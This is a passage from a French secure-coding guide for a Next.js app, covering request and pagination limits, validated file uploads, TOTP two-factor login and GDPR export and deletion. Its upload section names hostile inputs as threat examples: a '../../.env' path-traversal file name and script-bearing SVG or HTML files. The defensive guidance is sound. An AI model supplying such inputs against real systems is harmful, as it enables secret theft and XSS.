  ]);

  return NextResponse.json({ reset: reset.count, verify: verify.count, unverified: unverified.count });
}
```

> `user.createdAt` doit exister dans le schéma (`createdAt DateTime @default(now())`).

⚠️ **Pièges.** Le plan gratuit de Vercel limite la fréquence des crons (vérifier la doc actuelle). Sur Railway, un service « cron » dédié fait la même chose.

---

## 15. Limites sur les routes métier

🎯 **Contre quoi.**
- Un script qui crée 1 million de séances en boucle → base remplie, facture qui grimpe.
- `GET /api/seance` sans pagination sur un compte avec 50 000 lignes → réponse énorme, timeout, mémoire saturée.
- Un body JSON de 50 Mo → parsing coûteux.

⚙️ **Principe.** Tout ce qui est contrôlé par le client doit avoir une **borne côté serveur** : nombre de requêtes, nombre de résultats, taille des données.

🛠️ **Mise en place.**

```ts
// Rate limit par utilisateur sur les écritures
export const writeLimit = new Ratelimit({
  redis, limiter: Ratelimit.slidingWindow(60, "1 m"), prefix: "ratelimit:write:user",
});

const { success } = await writeLimit.limit(userId);
if (!success) return NextResponse.json({ message: "Trop de requêtes" }, { status: 429 });
```

```ts
// Pagination bornée côté serveur
const paginationSchema = z.object({
  take: z.coerce.number().int().min(1).max(50).default(20),
  cursor: z.string().cuid().optional(),
});

const { take, cursor } = paginationSchema.parse(Object.fromEntries(req.nextUrl.searchParams));
const seances = await prisma.seance.findMany({
  where: { userId },
  take,
  ...(cursor && { skip: 1, cursor: { id: cursor } }),
  orderBy: { createdAt: "desc" },
});
```

```ts
// Quota métier : nombre max de ressources par utilisateur
const count = await prisma.seance.count({ where: { userId } });
if (count >= 1000) return NextResponse.json({ message: "Limite atteinte" }, { status: 403 });
```

- **Taille du body** : Vercel limite déjà à ~4,5 Mo ; sur un serveur Express, `express.json({ limit: "100kb" })`.

⚠️ **Pièges.** `.max()` sur les tableaux aussi : `z.array(item).max(100)`, sinon un seul body peut contenir 100 000 éléments à insérer.

---

## 16. Upload de fichiers

🎯 **Contre quoi.**
- Uploader un `.html` ou `.svg` contenant du JavaScript, servi depuis ton domaine → XSS.
- Un fichier nommé `../../.env` → écriture hors du dossier prévu (_path traversal_).
- Un fichier de 2 Go → saturation du disque ou de la mémoire.
- Un `.exe` renommé `photo.jpg` : l'extension et le `Content-Type` envoyés par le client sont **déclaratifs**, donc falsifiables.

⚙️ **Principe.** Ne jamais faire confiance au nom, à l'extension ou au type annoncé. Vérifier le **contenu réel** (les _magic bytes_ : les premiers octets d'un PNG sont toujours `89 50 4E 47`), renommer, et stocker **hors** de l'application.

🛠️ **Mise en place.**

```ts
// app/api/avatar/route.ts
import { fileTypeFromBuffer } from "file-type";
import { randomUUID } from "crypto";

const MAX_SIZE = 2 * 1024 * 1024; // 2 Mo
const ALLOWED = ["image/png", "image/jpeg", "image/webp"]; // pas de SVG

export async function POST(req: NextRequest) {
  const userId = await getUserIdFromRequest(req);
  if (!userId) return NextResponse.json({ message: "Non authentifié" }, { status: 401 });

  const form = await req.formData();
  const file = form.get("file");
  if (!(file instanceof File) || file.size > MAX_SIZE) {
    return NextResponse.json({ message: "Fichier invalide" }, { status: 400 });
  }

  const buffer = Buffer.from(await file.arrayBuffer());
  const type = await fileTypeFromBuffer(buffer); // lit les magic bytes
  if (!type || !ALLOWED.includes(type.mime)) {
    return NextResponse.json({ message: "Format non autorisé" }, { status: 400 });
  }

  const key = `avatars/${userId}/${randomUUID()}.${type.ext}`; // nom généré, jamais celui du client
  await uploadToStorage(key, buffer, type.mime); // S3, R2, Cloudinary, Vercel Blob…
  await prisma.user.update({ where: { id: userId }, data: { avatarKey: key } });

  return NextResponse.json({ key });
}
```

**Pour les gros fichiers :** _presigned URL_. Le serveur génère une URL d'upload temporaire et signée, le client envoie le fichier **directement** au stockage (le serveur ne le voit pas passer).

⚠️ **Pièges.**
- **SVG = HTML** : il peut contenir `<script>`. Le refuser, ou le servir depuis un domaine séparé avec `Content-Disposition: attachment`.
- Pour les images, ré-encoder (librairie `sharp`) supprime les métadonnées EXIF, qui contiennent parfois la **position GPS** de la photo.
- Fichiers privés : bucket privé + URL signée à durée limitée, pas un bucket public avec des noms « difficiles à deviner ».

---

## 17. Double authentification (TOTP)

🎯 **Contre quoi.** Le mot de passe compromis (phishing, fuite, réutilisation). Avec la 2FA, il ne suffit plus : il faut aussi le téléphone de l'utilisateur.

⚙️ **Principe (TOTP, RFC 6238).** Le serveur et l'application d'authentification (Google Authenticator, Aegis, 1Password…) partagent un **secret**. Chacun calcule `HMAC(secret, heure actuelle / 30 s)` → code à 6 chiffres qui change toutes les 30 secondes. Aucun réseau nécessaire côté téléphone.

```
Activation : serveur génère secret ─► QR code (otpauth://...) ─► scanné par l'app
             utilisateur saisit un code ─► serveur vérifie ─► 2FA activée + codes de secours

Login :      email + mot de passe OK ─► token temporaire "mfa_pending" (5 min)
             code TOTP ─► vérifié ─► vraie session
```

🛠️ **Mise en place.**

```prisma
model User {
  // ...
  totpSecretEnc String?   // secret chiffré, jamais en clair
  totpEnabledAt DateTime?
  backupCodes   BackupCode[]
}

model BackupCode {
  id       String    @id @default(cuid())
  codeHash String
  userId   String
  user     User      @relation(fields: [userId], references: [id], onDelete: Cascade)
  usedAt   DateTime?
}
```

**Librairie :** `otplib` (génération du secret, de l'URI `otpauth://` et vérification) + `qrcode` pour afficher le QR. L'API de `otplib` a changé entre versions majeures : suivre la doc de la version installée.

**Chiffrement du secret** : contrairement au mot de passe, le serveur doit pouvoir **relire** le secret pour calculer le code → on le **chiffre** (pas de hachage), avec une clé hors de la base.

```ts
// lib/crypto.ts — AES-256-GCM, clé de 32 octets en base64 dans TOTP_ENC_KEY
import crypto from "crypto";
const KEY = Buffer.from(process.env.TOTP_ENC_KEY!, "base64");

export function encrypt(plain: string) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", KEY, iv);
  const data = Buffer.concat([cipher.update(plain, "utf8"), cipher.final()]);
  return [iv, cipher.getAuthTag(), data].map((b) => b.toString("base64")).join(".");
}

export function decrypt(payload: string) {
  const [iv, tag, data] = payload.split(".").map((s) => Buffer.from(s, "base64"));
  const decipher = crypto.createDecipheriv("aes-256-gcm", KEY, iv);
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(data), decipher.final()]).toString("utf8");
}
```

**Codes de secours** : 10 codes aléatoires affichés **une seule fois**, stockés hachés (comme des mots de passe), chacun à usage unique. Ils évitent la perte définitive du compte si le téléphone est perdu.

**Login en deux étapes :**
1. `POST /login` : mot de passe correct et `totpEnabledAt` non nul → renvoyer un JWT court `{ sub, mfa: "pending" }` (5 min), **pas** la session.
2. `POST /login/2fa { code }` : vérifier le JWT `pending` + le code TOTP (ou un code de secours) → renvoyer la vraie session.
3. Toutes les routes métier refusent un token `mfa: "pending"`.

⚠️ **Pièges.**
- Rate limiter la saisie du code : 6 chiffres = 1 million de possibilités, faisable sans limite.
- Refuser la réutilisation d'un code déjà accepté dans la même fenêtre de 30 s.
- Les **passkeys** (WebAuthn) sont l'étape suivante : plus simples pour l'utilisateur et résistantes au phishing (librairie `@simplewebauthn/server`).

---

## 18. RGPD : export et suppression du compte

🎯 **Contre quoi.** Une obligation légale (UE) plutôt qu'une attaque : l'utilisateur a droit d'**accéder** à ses données, de les **emporter** (portabilité) et de les faire **supprimer**. Moins de données conservées = moins de dégâts en cas de fuite.

⚙️ **Principe.**
- **Minimisation** : ne collecter que ce qui sert (pas de date de naissance « au cas où »).
- **Durée de conservation** définie pour chaque donnée (logs, comptes inactifs, tokens).
- **Droits de l'utilisateur** accessibles sans écrire au support.

🛠️ **Mise en place.**

```ts
// app/api/account/export/route.ts
export async function GET(req: NextRequest) {
  const userId = await getUserIdFromRequest(req);
  if (!userId) return NextResponse.json({ message: "Non authentifié" }, { status: 401 });

  const data = await prisma.user.findUnique({
    where: { id: userId },
    select: {
      email: true,
      createdAt: true,
      seances: { include: { timerRunners: true, timerpauses: true } },
      // jamais : password, tokenVersion, totpSecretEnc, tokens
    },
  });

  return new NextResponse(JSON.stringify(data, null, 2), {
    headers: {
      "Content-Type": "application/json",
      "Content-Disposition": 'attachment; filename="mes-donnees.json"',
    },
  });
}
```

```ts
// app/api/account/route.ts — suppression (avec ré-authentification, fiche 7)
export async function DELETE(req: NextRequest) {
  const userId = await getUserIdFromRequest(req);
  if (!userId) return NextResponse.json({ message: "Non authentifié" }, { status: 401 });

  const body = z.object({ password: z.string().min(1).max(128) }).safeParse(await req.json().catch(() => null));
  if (!body.success) return NextResponse.json({ message: "Données invalides" }, { status: 400 });

  const user = await prisma.user.findUnique({ where: { id: userId } });
  if (!user || !(await bcrypt.compare(body.data.password, user.password))) {
    return NextResponse.json({ message: "Mot de passe incorrect" }, { status: 400 });
  }

  await prisma.user.delete({ where: { id: userId } }); // onDelete: Cascade supprime tout le reste
  after(() => sendAccountDeletedEmail(user.email).catch(() => console.error("MAIL_DELETED_FAILED")));
  return new NextResponse(null, { status: 204 });
}
```

**Checklist RGPD minimale :**
- [ ] Page « Politique de confidentialité » : quelles données, pourquoi, combien de temps, quels sous-traitants (Vercel, Railway, Resend, Sentry, Upstash).
- [ ] Toutes les relations vers `User` en `onDelete: Cascade` (sinon la suppression échoue ou laisse des orphelins).
- [ ] Données aussi supprimées chez les sous-traitants si elles y sont stockées (fichiers uploadés, contacts Resend).
- [ ] Durée de rétention des logs configurée chez l'hébergeur.
- [ ] Sur mobile : l'App Store et le Play Store **exigent** une option de suppression de compte dans l'app pour toute app avec création de compte.

⚠️ **Pièges.** Les **sauvegardes** contiennent encore les données supprimées : c'est accepté si elles expirent dans un délai défini (ex : 30 jours) et ne sont restaurées qu'en cas d'incident.

---

## Pour aller plus loin

- **OWASP Cheat Sheet Series** — une fiche par sujet (Authentication, Password Storage, CSRF, XSS, File Upload…) : https://cheatsheetseries.owasp.org
- **OWASP ASVS** — la liste de vérification complète, par niveau : https://owasp.org/www-project-application-security-verification-standard/
- **NIST SP 800-63B** — la référence sur les mots de passe : https://pages.nist.gov/800-63-4/sp800-63b.html
- **CNIL** — guide RGPD du développeur : https://www.cnil.fr/fr/guide-rgpd-du-developpeur
